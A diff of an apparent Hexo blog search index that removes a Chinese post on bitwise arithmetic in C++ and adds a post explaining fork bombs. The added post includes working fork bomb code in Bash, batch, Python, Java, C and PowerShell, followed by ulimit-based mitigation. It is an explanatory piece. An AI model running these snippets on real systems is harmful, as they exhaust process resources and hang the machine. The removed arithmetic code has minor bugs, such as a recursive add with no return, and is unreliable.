<br>结果正确！<br></code></pre></div></td></tr></table></figure>
-<p>sum=a^b 表明对a和b求和（不考虑进位），而 (a&amp;b)&lt;&lt;1 表明求a和b中哪个位发生了进位，并且将该位置于最高位(通过左移一位)</p>
-<p>因此C++代码如下:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// 迭代1，按照上面的思路来写</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> carry=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        sum=a^b;<br>        carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>        a=sum;<br>        b=carry;<br>    &#125; <span class="hljs-keyword">while</span> (carry); <span class="hljs-comment">//判断是否有进位。如无，则表示没有可以加的值</span><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">// 迭代2</span><br><span class="hljs-comment">// 还可以修改为以下代码</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=a; <br>    <span class="hljs-keyword">int</span> carry=b;<br>    <span class="hljs-keyword">while</span> (carry)&#123;<br>        <span class="hljs-keyword">int</span> temp=sum;<br>        sum=temp^carry; <span class="hljs-comment">//a+b</span><br>        carry=(temp&amp;carry)&lt;&lt;<span class="hljs-number">1</span>; <span class="hljs-comment">//进1位</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">//递归</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;<br>    <span class="hljs-keyword">int</span> carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> sum=a^b;<br>    <span class="hljs-comment">// 将a+b转化为sum+carry</span><br>    <span class="hljs-built_in">add</span>(sum,carry);<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h2 id="减法运算"><a class="markdownIt-Anchor" href="#减法运算"></a> 减法运算</h2>
-<p>由于计算机只会进行加法运算，那么减法就可以转变为加法运算，这涉及到计算机的原码反码和补码知识了。这里简单提下</p>
-<ul>
-<li>正数的 <strong>原码=反码=补码</strong></li>
-<li>负数的 原码=正数的原码且最高位置为1。<br />
-如32位-3原码可表示为 10000000000000000000000000000011</li>
-<li>负数的反码为其原码的最高位1不变，其余位取反(~)<br />
-如32位-3反码可表示为 11111111111111111111111111111100</li>
-<li>负数的补码为其反码+1<br />
-如32位-3补码可表示为 11111111111111111111111111111101</li>
-</ul>
-<p><strong>目前补码普遍是计算机内部数值的表示方式，它很好的解决了 +0 和 -0的问题</strong></p>
-<p>因此减法运算就变得十分简单的<br />
-代码如下</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// a - b = a + (-b) = a + (~b + 1 )</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subtract</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> negative=<span class="hljs-built_in">add</span>(~b,<span class="hljs-number">1</span>); <span class="hljs-comment">// ~b + 1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">add</span>(a,negative); <br>&#125;<br></code></pre></div></td></tr></table></figure>
-<p>负数和正数转换(设x&gt;0)：</p>
-<blockquote>
-<p>-x=(~x+1)  如 -10=(~10+1)<br />
-x=~(-x-1)  如 10=~(-10-1)<br />
-x=~(-x)+1 如 10=~(-10)+1</p>
-</blockquote>
-<h2 id="乘法运算"><a class="markdownIt-Anchor" href="#乘法运算"></a> 乘法运算</h2>
-<p>其实乘法也就是多个加法的累积求和，在我们小学时，25×5应该是这样计算的</p>
-<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">   <span class="hljs-number"> 2 </span>5<br> × <span class="hljs-number"> 0 </span>5<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br>+<span class="hljs-number"> 0 </span>0<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br></code></pre></div></td></tr></table></figure>
-<p>二进制也可以这样计算，不过就是满2进1。这里还是以25×5=125为例</p>
-<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>     ×      <span class="hljs-number"> 1 </span>0<span class="hljs-number"> 1 </span>  = 5<br>————————————————————<br>      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>+   <span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0     = 0<br>+ <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1       = 25&lt;&lt;2 = 25*2^2=120<br>——————————————————— <br>  <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 0 </span>1   =<span class="hljs-number"> 125 </span>= 25+120<br></code></pre></div></td></tr></table></figure>
-<p>将乘法分解为加法即可实现位运算，大致思路如下，<br />
-存在一个函数 <code>int multiply(int a,int b);</code><br />
-1.若b&lt;0，则对b求负化为<strong>正数</strong>，同时设置一个标识neagtive_mask记录该b是负数<br />
-2.对除数b不断右移b&gt;&gt;=1并且取得b最低位的值(0或1)，直到b=0<br />
-3.若为1，则add操作得sum<br />
-4.a不断左移1位 a&lt;&lt;=1<br />
-5.结尾判断neagtive_mask来设置sum的正负</p>
-<p>注意，除数如果为负数，假设为 11111111111111111111111111111011 (-5)，那么其右移得不到b=0，至于被除数可以小于0<br />
-具体代码如下</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">multiply</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-comment">// 判断正负</span><br>    <span class="hljs-keyword">bool</span> neagtive_mask=(b&lt;<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<span class="hljs-number">2</span><br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化为正数: -x=(~x+1) &lt;-&gt; x=-(-x-1) (x&gt;0) </span><br>    &#125;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (b) <br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">0x1</span>)&#123; <span class="hljs-comment">//取最低位，最低位为1，求和</span><br>            sum=<span class="hljs-built_in">add</span>(sum,a); <span class="hljs-comment">//累加</span><br>        &#125;<br>        b&gt;&gt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 除数右移将最低位溢出</span><br>        a&lt;&lt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 被除数左移</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(neagtive_mask)&#123;<br>        sum=~(sum<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h2 id="除法运算"><a class="markdownIt-Anchor" href="#除法运算"></a> 除法运算</h2>
-<p>除法就相对来说复杂了，不过除法类似减法，不断地减去除数得到商，最后剩下余数<br />
-这里还是以小学数学除法为例子 37÷3=12…1</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">     <span class="hljs-number">12</span> <br>  -----<br><span class="hljs-number">3</span> | <span class="hljs-number">37</span><br>  - <span class="hljs-number">3</span><br>   ----	<br>      <span class="hljs-number">7</span><br>    - <span class="hljs-number">6</span>   <br>    ---<br>      <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
-<p>其中这操作还可以转换为</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>     <span class="hljs-number">1</span><br>   -----<br><span class="hljs-number">30</span> | <span class="hljs-number">37</span>    <br>   - <span class="hljs-number">30</span><br>    ----	<br>	  <span class="hljs-number">7</span>  <br>步骤<span class="hljs-number">2</span><br>    <span class="hljs-number">2</span><br>   ----<br> <span class="hljs-number">3</span>| <span class="hljs-number">7</span>   <br>   <span class="hljs-number">-6</span><br>    ---	<br>    <span class="hljs-number">1</span><br>  <br>商: <span class="hljs-number">1</span>*<span class="hljs-number">10</span>^<span class="hljs-number">1</span> + <span class="hljs-number">2</span>*<span class="hljs-number">10</span>^<span class="hljs-number">0</span> = <span class="hljs-number">10</span>+<span class="hljs-number">2</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
-<p>发现了什么吗？</p>
-<p>现在我们把上面十进制换成二进制</p>
-<blockquote>
-<p>37: 100101<br />
-3:       0011<br />
-7:       1101</p>
-</blockquote>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>         <span class="hljs-number">1</span><br>      --------<br> <span class="hljs-number">11000</span>|	<span class="hljs-number">100101</span> -&gt;a=<span class="hljs-number">37</span>  <br>       - <span class="hljs-number">11000</span> <br>    	-------	<br>	      <span class="hljs-number">1101</span> -&gt;<span class="hljs-number">7</span><br>步骤<span class="hljs-number">2</span><br>       <span class="hljs-number">1</span><br>    ------<br><span class="hljs-number">1100</span>| <span class="hljs-number">1101</span>  -&gt;a=<span class="hljs-number">7</span><br>   -  <span class="hljs-number">1100</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>步骤<span class="hljs-number">3</span><br>         <span class="hljs-number">0</span><br>    ------<br> <span class="hljs-number">110</span>|   <span class="hljs-number">1</span> <br>   -    <span class="hljs-number">0</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>商: <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">2</span> + <span class="hljs-number">0</span> <br>  = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">3</span> + <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">2</span> + <span class="hljs-number">0</span><br>  = <span class="hljs-number">8</span>+<span class="hljs-number">4</span>+<span class="hljs-number">0</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
-<p>在上面例子中，除数3<strong>左移3位</strong>变为 11000，接着除数3<strong>左移2位</strong>变为 1100，最后<strong>左移1位</strong>变为 110。<br />
-此时发现 <strong>被除数1</strong> 小于 <strong>除数110</strong>，因此商为0（C++语言中除法运算导致返回一个<strong>整数</strong>）。<br />
-因此如果发现被除数小于除数，那么直接返回0即可。</p>
-<p>于是要先找到除数应该左移的位数，且使得除数是&lt;=除数<br />
-然后利用减法 :a=subtract(a,b&lt;&lt;nMove)</p>
-<p>利用加法 :当前累加值r=add(前一个值累加值r,1&lt;&lt;nMove)</p>
-<p>代码如下</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divide</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> nMove=<span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">bool</span> negative_mask=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">0</span>)&#123;<br>        a=~(a<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        negative_mask=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        <span class="hljs-comment">// 同号得正，异号的负</span><br>        negative_mask=negative_mask==<span class="hljs-literal">false</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(a&lt;b)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-comment">// 找到除数应该左移的位数，且使得除数是&lt;=除数</span><br>    <span class="hljs-keyword">for</span> ( nMove = <span class="hljs-number">0</span>; nMove&lt;<span class="hljs-number">32</span>;nMove++)&#123;<br>        <span class="hljs-keyword">if</span>((b&lt;&lt;nMove)&gt;=a)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> r=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = nMove; i &gt;=<span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-keyword">int</span> t=b&lt;&lt;i;<br>        <span class="hljs-keyword">if</span>(a&lt;t) <span class="hljs-comment">// 被除数小于除数</span><br>            <span class="hljs-keyword">continue</span>;<br>        a=<span class="hljs-built_in">subtract</span>(a,t);<br>        r=<span class="hljs-built_in">add</span>(r,<span class="hljs-number">1</span>&lt;&lt;i);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(negative_mask)&#123;<br>        r=~(r<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h2 id="输出二进制"><a class="markdownIt-Anchor" href="#输出二进制"></a> 输出二进制</h2>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printBinary</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>	<span class="hljs-keyword">char</span> strBinary[<span class="hljs-number">33</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bitmask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>	&#123;<br>		<span class="hljs-keyword">char</span> k = ((number &amp; bitmask)&gt;&gt;<span class="hljs-number">31</span>)?<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>;<br>		strBinary[i] = k;<br>		number &lt;&lt;= <span class="hljs-number">1</span>;<br>	&#125;<br>	cout &lt;&lt; strBinary &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h2 id="简单数据交换"><a class="markdownIt-Anchor" href="#简单数据交换"></a> 简单数据交换</h2>
-<p>利用xor位异或来实现值交换</p>
-<p>原理:</p>
-<blockquote>
-<p>a ^ a = 0<br />
-a ^ 0 = a<br />
-0 ^ a = a</p>
-</blockquote>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;<br>a=a^b; <span class="hljs-comment">// a=a^b;</span><br>b=a^b; <span class="hljs-comment">// b=(a^b)^b=a^(b^b)=a^0=a;</span><br>a=a^b; <span class="hljs-comment">// a=(a^b)^a=(a^a)^b=0^b=b;</span><br></code></pre></div></td></tr></table></figure>
-<p>bye~</p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -1056,8 +1056,8 @@ db.test.update({‘age’:{‘<span class='katex-error' title='ParseError: KaTeX
         <category>MongoDB</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
         <tag>C</tag>
         <tag>MongoDB</tag>
       </tags>
@@ -1185,8 +1185,8 @@ set()中可以有两种写法</p>
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
         <tag>Qt</tag>
       </tags>
   </entry>
@@ -1218,9 +1218,56 @@ set()中可以有两种写法</p>
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
+        <tag>Linux</tag>
         <tag>Qt</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fork bomb命令</title>
+    <url>/fork-bomb-commands/</url>
+    <content><![CDATA[<p><strong>Fork bomb</strong> 是一种拒绝服务攻击，无限 <strong>fork</strong> 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。</p>
+<span id="more"></span>
+<h3 id="linux-bash"><a class="markdownIt-Anchor" href="#linux-bash"></a> Linux Bash</h3>
+<p>一个最简单的例子 (请在虚拟机上执行！)</p>
+<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span><span class="hljs-symbol">:</span>()&#123; <span class="hljs-symbol">:|</span><span class="hljs-symbol">:&amp;</span> &#125;;<span class="hljs-symbol">:</span><br></code></pre></div></td></tr></table></figure>
+<ul>
+<li>😦) 定义一个名为 <strong>:</strong> 的函数</li>
+<li>{ … } 函数体</li>
+<li>😐: 递归调用该命令</li>
+<li>&amp; 后台运行，前台运行直接为 <strong>;</strong></li>
+<li>; 分割符</li>
+<li>: 执行名为 <strong>:</strong> 的函数</li>
+</ul>
+<p>执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。</p>
+<h3 id="windows-batch"><a class="markdownIt-Anchor" href="#windows-batch"></a> Windows Batch</h3>
+<p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash">0 | %0</span><br></code></pre></div></td></tr></table></figure>
+<h3 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h3>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	os.fork()<br></code></pre></div></td></tr></table></figure>
+<h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h3>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForkBomb</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)<br>    &#123;<br>      Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;javaw&quot;</span>, <span class="hljs-string">&quot;-cp&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>), <span class="hljs-string">&quot;ForkBomb&quot;</span>&#125;);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h3>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>      fork();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>) &#123; <br>    <span class="hljs-built_in">Start-Process</span> powershell.exe <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;-NoExit&quot;</span>, <span class="hljs-string">&quot;Get-ChildItem -Recurse C:&quot;</span>;<br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;while($true) &#123;Start-Process powershell.exe -ArgumentList &quot;-NoExit&quot;, &quot;Get-ChildItem -Recurse C:&quot;&#125;&#x27;</span>;&#125;<br><br></code></pre></div></td></tr></table></figure>
+<h3 id="避免"><a class="markdownIt-Anchor" href="#避免"></a> 避免</h3>
+<p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
+<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">$ ulimit -<span class="hljs-selector-tag">a</span><br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>scheduling priority             (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 30195<br>max locked memory       (kbytes, -l) 16384<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (<span class="hljs-number">512</span> bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>real-<span class="hljs-selector-tag">time</span> priority              (-r) 0<br>stack size              (kbytes, -s) 8192<br>cpu <span class="hljs-selector-tag">time</span>               (seconds, -t) unlimited<br>max user processes              (-u) 30195<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited<br><br></code></pre></div></td></tr></table></figure>
+<p>但是这只能在当前终端生效。因此，还可以修改 <strong>/etc/security/limits.conf</strong> 配置文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">#<span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br>*               soft    nproc            4096<br></code></pre></div></td></tr></table></figure>
+<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
+<p>参考资料</p>
+<ul>
+<li><a href="https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html">https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html</a></li>
